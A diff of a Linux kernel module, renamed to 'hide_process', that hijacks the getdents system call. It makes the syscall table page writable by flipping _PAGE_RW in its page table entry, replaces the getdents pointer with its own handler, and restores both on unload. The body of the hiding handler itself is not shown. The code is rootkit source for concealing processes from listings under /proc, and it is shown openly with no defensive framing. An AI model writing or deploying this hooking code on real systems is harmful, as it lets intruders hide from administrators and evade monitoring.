@@ -11,7 +11,7 @@
 #include <linux/highmem.h>
 #include <linux/sched.h>
 #include <linux/namei.h>	/* Needed for kern_path & LOOKUP_FOLLOW */
-#include "intercept.h"
+#include "hide_process.h"
 
 asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
@@ -76,7 +76,7 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 	return nread;
 }
 
-int __init chdir_init(void){
+static int __init hide_process_init(void){
 	unsigned int l;
 	proc_ino = get_inode_no("/proc");
 	if (proc_ino < 0)
@@ -84,24 +84,23 @@ int __init chdir_init(void){
 	pte_t *pte;
 	kstrtoul(table_ptr, 16, (long unsigned int *)&syscall_table);
 	pte = lookup_address((long unsigned int)syscall_table,&l);
-	pte->pte |= _PAGE_RW;
+	pte->pte |= _PAGE_RW; //set page to be writable
 	real_getdents = syscall_table[__NR_getdents];
 	syscall_table[__NR_getdents] = my_getdents_syscall;
 	printk("Patched!\nOLD :%p\nIN-TABLE:%p\nNEW:%p\n", real_getdents, syscall_table[__NR_getdents],my_getdents_syscall);
 	return 0;
 }
 
-void __exit chdir_cleanup(void){
+static void hide_process_exit(void){
 	unsigned int l;
 	pte_t *pte;
 	syscall_table[__NR_getdents] = real_getdents;
 	pte = lookup_address((long unsigned int)syscall_table,&l);
-	pte->pte &= ~_PAGE_RW;
+	pte->pte &= ~_PAGE_RW; //set page to read only
 	printk("Exit\n");
 	return;
 }
 
-module_init(chdir_init);
-module_exit(chdir_cleanup);
+module_init(hide_process_init);
+module_exit(hide_process_exit);
 MODULE_LICENSE("GPL");
-
